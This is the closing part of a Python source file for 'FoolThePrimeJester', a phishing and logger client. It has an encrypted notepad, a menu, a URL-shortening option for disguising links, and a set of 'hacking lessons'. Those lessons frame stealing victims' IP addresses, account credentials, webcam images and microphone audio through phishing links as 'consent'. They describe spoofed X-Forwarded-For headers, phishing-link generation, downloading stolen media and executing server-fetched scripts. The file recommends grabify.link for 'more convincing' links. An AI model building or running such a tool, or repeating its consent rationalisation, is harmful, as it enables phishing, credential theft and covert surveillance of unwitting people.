					f.write(input("Enter Note Content: "))
			with open("temp_content.txt", "rb") as f:
				content = f.read().decode("utf-8", errors="ignore")
			print("Byte fragmentation for temp file...")
			with open("temp_content.txt", "wb") as f:
				f.write(random._urandom(len(content)*4))
			print("Deleting file...")
			try:
				os.remove("temp_content.txt")
			except:
				pass
			secretdatabase[name] = encrypt(content, superkey)
			input("[ Enter ]")
		elif i == "3":
			if superkey == None:
				input("[ Super Key is not found. Please generate keys ]")
			name = input("Name of note: ")
			name = encrypt(name, superkey)
			if name in secretdatabase:
				content = secretdatabase[name]
				try:
					content = decrypt(content, superkey)
				except Exception as e:
					content = str(e)
				print()
				print(content)
				print()
			else:
				print("Note not found. (If your password is wrong, even the note name is encrypted so I can't do it even if I wanted to. The only solution is to enter the password correctly or enter the correct note name.)")
			input("[ Enter ]")
		elif i == "0":
			break
			
def ftpjhacklessons():
	print("\033[0m")
	yourlang = input("Your Language (en/tr/ru/de/...): ")
	lessons = ["FTPJ is a hacking art—a professional art, yet crafted simply for usability. The FTPJ system operates on a principle of request and consent. It subtly enforces acceptance of certain policies, even if the individual doesn’t explicitly desire it. For instance, if a person sends us their data—like their IP address—we use it because they provided it willingly. They’ve sent it to us themselves, embedded in the XFF HTTP header, effectively handing over their IP address. By doing so, they’ve consented to its use. They’ve submitted it of their own accord. Similarly, when they enter their account credentials, there’s no coercion involved—they’ve chosen to input that information freely. They’ve granted camera and microphone permissions without any force—it’s their decision entirely. FTPJ is designed to suit both white-hat and black-hat practitioners, embodying a duality of purpose. It’s truly an art, and that art is called 'Request and Consent.' Request and permission. Request and consequence. The people you hack have accepted these terms themselves—through their actions, they’ve given you the green light to proceed, whether they realize it or not. This is the elegance of FTPJ: it leverages voluntary submission, turning the target’s own choices into the foundation of the exploit.","So why this information? Why the camera? Why the microphone? Why account credentials? Why website data? Why network details? Why HTTP headers and environment variables? Because all of it—every single piece—is something they’ve sent to us themselves. We’d be fools not to use it. Imagine someone handing you a treasure chest and saying, 'Here, take it'—would you refuse? Of course not. The camera captures their surroundings because they allowed access; the microphone records their voice because they permitted it. Account credentials unlock their digital lives because they typed them in willingly. Website data reveals their online behavior because they navigated there. Network details expose their infrastructure because they connected to us. HTTP headers and environment variables map their technical footprint because their own systems transmitted them. Each element is a gift they’ve offered up, consciously or not, and FTPJ simply accepts what’s given. To ignore this would be to waste opportunity—we’re not naive enough to let that happen. This is about maximizing what’s provided, turning their own actions into our advantage, all while staying within the boundaries of what they’ve agreed to share.", "FTPJ is not just a tool—it’s a canvas where the hacker paints with the colors of consent. ‘Give me your data,’ it whispers, and they do, willingly or not. The art lies in the simplicity: a phishing link clicked, a form filled, a permission granted. Technically, it’s a symphony of HTTP requests—XFF headers spilling IP addresses like ink, WebRTC leaking network secrets, and browser APIs handing over camera and microphone streams. ‘The fool hands over the key to his own cage,’ says the proverb, and FTPJ proves it. Every click is a signature on an invisible contract, every submission a brushstroke in this masterpiece of exploitation. White hats use it to test defenses, black hats to breach them—both dance to the same tune of voluntary surrender.","In FTPJ, the target is the artist, and we are merely the gallery. ‘A man’s own hand carves his fate,’ the wise say, and here it’s literal—they send us their credentials, their photos, their voices. Why? Because we ask, and they answer. The technical beauty is in the details: JavaScript captures geolocation, HTML5 media APIs snag audio and video, and server-side logs hoard every header—User-Agent, Referer, Accept-Language—all gifts from their browser. We don’t break in; they open the door. This is the art of Patience, the craft of letting them build their own trap, step by step, byte by byte.","FTPJ turns hacking into poetry—‘The willing prey feeds the hunter,’ as the saying goes. It’s not about force; it’s about flow. They visit our page, and the browser spills its guts: IP via XFF, system info via navigator objects, even screen resolution via window properties. We ask for their account details, and they type them in. We request media access, and they click ‘Allow.’ Technically, it’s a marvel—RESTful APIs collect the data, base64 encodes the media, and JSON structures it all for us. The art is in the honesty: we never steal what isn’t offered, but we take everything they give.","With FTPJ, every hack is a mirror—‘Show me who you are, and I’ll show you your ruin,’ the ancients might say. They hand us their digital soul: IP addresses from TCP packets, browser fingerprints from canvas rendering, account logins from POST requests. The microphone hums their secrets, the camera frames their world—all because they said yes. Technically, it’s a ballet of protocols—HTTP headers reveal their path, WebSocket streams keep it live, and local storage caches their mistakes. This is art forged in consent, a truth as old as trust itself.","FTPJ is the sculptor’s chisel, and the target’s choices are the stone. ‘A fool’s gift is a wise man’s weapon,’ the proverb rings true. They click our link, and the script runs—fetching IP via server-side lookups, grabbing media with getUserMedia, scraping headers with every request. We don’t hack their system; they hack themselves by complying. The technical edge? Asynchronous calls for speed, MIME types for media handling, and encryption for our own safety. It’s an art of reflection—showing them their own generosity is their downfall.","In the world of FTPJ, hacking is a dance—‘Step forward, and I’ll lead you to the edge,’ the saying promises. They waltz in with their data: IPs from X-Real-IP, credentials from form submissions, audio from MediaRecorder APIs. The camera snaps because they let it; the logs fill because they allow it. Technically, it’s a masterpiece—AJAX pulls live updates, regex parses their input, and cloud storage hoards the bounty. This isn’t theft; it’s an invitation accepted, a rhythm they set themselves.","FTPJ crafts a tale of trust—‘Give me your hand, and I’ll take your arm,’ the old words warn. They send us their network details via ifconfig mimics, their account keys via careless forms, their faces via webcam streams. We ask, they provide—simple as that. The technical weave? DNS lookups for their domain, HTTP/2 for speed, and blob objects for media chunks. It’s an art of inevitability—once they start, they can’t stop handing over the pieces of their digital life.","Finally, FTPJ is the ultimate truth—‘A man’s own voice sings his demise,’ the poets say. They click, they type, they speak, and we listen. IPs flow from X-Forwarded-For, passwords from unsecured inputs, audio from Web Audio APIs—all theirs to give, ours to take. Technically, it’s flawless—server-side validation, client-side obfuscation, and real-time logging. This is the art of the inevitable: they offer the thread, we weave the tapestry, and the picture is theirs alone.", "FTPJ’s code is a dark symphony—‘The tool crafts the trap, but the fool sets it,’ the wise murmur. At its core, the FTPJ server hums with custom FTPJ requests—not HTTP, but a twisted cousin—pulling logs from victims who click. The client, a Python beast, wields `premius_request` to spoof IPs with `random_ip()`, faking XFF headers to dodge tracing, while `requests.Session()` keeps it persistent. ‘Art is in the deception,’ and here it’s technical: threading with `lock` guards the `domain_ip` cache, `socket.gethostbyname` resolves targets, and `base64` encodes stolen camera snaps. This is FTPJ—half code, half consent, all cunning.","In the FTPJ client, every line is a brushstroke—‘The hand that writes also binds,’ the ancients hint. The `loggermenu` function is the heart, spitting out phishing links via `logger_link_generator`, weaving `input`, `output`, and `adminput` into a URL that snares the naive. Technically, it’s a marvel: `download_and_save` rips JSON logs, decodes base64 media with `base64.b64decode`, and saves it all—IP logs from `access`, credentials from `account`, webcam shots from `camera`. The art? They give it freely, and the code just takes it, relentless and precise.","FTPJ’s soul is its server-client dance—‘A whisper lures, a shout collects,’ the poets muse. The client’s `create_logger` hits the server with a custom `FTPJ` method, passing `verify_key` from `get_verify_key` to authenticate, then stores logs under `adminput`. On the tech side, `premius_request` crafts headers—`X-Real-IP`, `User-Agent` from `fake_useragent`, all randomized—to mimic legitimacy. The server replies with JSON, and `show_all` pulls it back, threading in `loop_download_and_save` to hoard it all. This is art in motion: they click, we collect, the code connects.","The FTPJ client bends reality—‘Truth is what they offer, not what we take,’ the saying goes. Its `random_ua()` pulls from `UserAgent()` to spoof browsers, while `random_ip()` crafts fake IPs, dodging private ranges like 192.168.x.x. Technically, it’s slick: `os.walk` in `play_one` finds music, `pygame.mixer` or `sox` plays it, but the real gem is `download_and_save`—it parses `auto_data` for IPs, `headers` for agents, and `lookup` for geolocation. The art lies in their consent; the code just frames it, pixel by pixel.","FTPJ’s genius is its patience—‘The river carves the stone in time,’ the old ones say. The client’s `loggermenu` loops options—phishing links, log downloads, user modeling with `users` dicts tracking IPs across `access`, `camera`, `microphone`. Tech shines here: `threading.Thread` in option 4 runs `loop_download_and_save`, `json.dumps` structures logs, and `os.chdir` navigates dirs. It’s not brute force; it’s a slow harvest, built on their clicks, coded to perfection in Python’s grip.","In FTPJ, the code is the trap’s teeth—‘A gift given is a chain worn,’ the proverb warns. The `premiustool` function fetches server-side scripts with `SSP Key`, executing them via `exec`—dangerous, brilliant. Technically, it’s layered: `socket` resolves domains, `lock` syncs threads, `base64.b64encode` hides queries in `logger_link_generator`. The client waits for their move—clicks trigger logs, `show_all` fetches them, and `format` spits JSON or text. This is art: they step in, the code snaps shut.","FTPJ’s client is a thief of shadows—‘What’s offered in light is taken in dark,’ the sages nod. The `secret_notepad` hides notes with `encrypt`, using a `superkey` from `superkey_generate`—a math dance of `ord` and exponents. Tech details? `os.path.join` secures files, `json.dumps` saves encrypted data, `decrypt` reverses it. Meanwhile, `url_shorteners` masks phishing with `is.gd` or `tinyurl`, all via `premius_request`. It’s artful theft: they give, the code cloaks and keeps.","The FTPJ system thrives on their trust—‘A door unlocked invites the guest,’ the poets sing. The client’s `my_host` ties to `pythonanywhere.com`, where `FTPJ` calls hit endpoints like `/verify` or `/create_logger`. Technically, it’s tight: `threading.Lock` in `loop_download_and_save` prevents overlaps, `fake_useragent` rotates UAs, and `os.system` clears screens. The art? They click, the client logs, the server stores—every piece willingly surrendered, perfectly coded.","FTPJ’s code is a mirror of intent—‘The fool sees a gift, the wise see a hook,’ the saying cuts. The `loggermenu` option 6 models users, merging `access`, `account`, `camera` logs into `users` dicts by IP—smart, surgical. Tech shines: `regex` could parse (if added), `os.listdir` reads dirs, `json.loads` digs into `auto_data`. It’s not just data; it’s their story, handed over click by click, woven by Python into a tapestry of exposure.","Finally, FTPJ’s client is pure art—‘The canvas is theirs, the paint ours,’ the masters declare. The `menu` drives it all—loggers, music, tools, lessons—while `premius_request` fakes `X-Forwarded-For`, `HTTP/2` speeds it, and `base64` secures media. Technically, it’s a fortress: `threading` for background tasks, `socket` for DNS, `os.name` for platform quirks. They offer their world—IPs, creds, voices—and the code, unyielding, turns it into our masterpiece."]
	try:
		translator = Translator()
	except:
		pass
	for h in lessons:
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		try:
			h = translator.translate(h, dest=yourlang, src="en").text
		except:
			pass
		print(h)
		input("\n[ NEXT ]")

def menu():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
		print("""\033[92m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \033[0m""")
	print("\033[91mFool\033[93mThePrimeJester\033[0m \033[96mPython Client\033[0m\n\n\033[94m[\033[93m 1 \033[94m]\033[96m Open my Loggers\n\033[94m[\033[93m 2 \033[94m]\033[96m Play Random Music\n\033[94m[\033[93m 3 \033[94m]\033[96m FTPJ PremiusTool\n\033[94m[\033[93m 4 \033[94m]\033[96m URL Shorteners\n\033[94m[\033[93m 5 \033[94m]\033[96m Client Options\n\033[94m[\033[93m 6 \033[94m]\033[96m Secret Notepad\n\033[94m[\033[93m 7 \033[94m]\033[96m Free FTPJ Hacking Lessons\n\n\033[94m[\033[93m 0 \033[94m]\033[96m EXIT\n\033[0m")
	i = input(">> ").strip()
	if i == "1":
		myloggersmenu()
	elif i == "2":
		play_one()
	elif i == "3":
		premiustool()
	elif i == "4":
		url = input("Enter URL: ")
		print()
		print("Shortening...")
		print()
		baseurl = "https://is.gd/create.php?format=simple&url="+quote(url)
		try:
			result = premius_request("GET", baseurl).text.strip()
			print(result)
		except:
			pass
		baseurl = "https://tinyurl.com/api-create.php?url="+quote(url)
		try:
			result = premius_request("GET", baseurl).text.strip()
			print(result)
		except:
			pass
		baseurl = "https://cleanuri.com/api/v1/shorten"
		try:
			result = requests.request("POST", baseurl, data={"url": url}).json()["result_url"]
			print(result)
		except:
			pass
		baseurl = "https://gg.gg/create"
		try:
			result = requests.request("POST", baseurl, data={"url": url}).text.strip()
			print(result)
		except:
			pass
		print()
		print("You can use \033[1mgrabify.link\033[0m for more convincing, more diverse and more links (Don't leave without trying!) (I'm haven't API for grabify...)")
		print()
		input("[ Enter ]")
	elif i == "5":
		client_options()
	elif i == "6":
		secret_notepad()
	elif i == "7":
		ftpjhacklessons()
	elif i == "0":
		return "exit"

for _ in range(10):
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
	print("""\033[92m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \033[0m""")
	print("Loading...")
	time.sleep(1/10)
if __name__ == "__main__":
	while menu() != "exit":
		pass
